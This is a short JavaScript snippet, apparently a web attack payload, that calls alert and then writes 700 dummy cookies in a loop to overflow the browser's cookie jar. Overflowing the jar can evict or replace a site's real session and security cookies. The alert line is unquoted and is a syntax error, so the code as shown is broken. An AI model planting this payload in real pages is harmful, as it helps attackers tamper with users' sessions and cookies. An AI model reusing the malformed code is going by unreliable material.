alert(cookie jar overflow);
for (let i = 0; i < 700; i++) {
  document.cookie = `cookie${i}=${i}; Secure`;
}
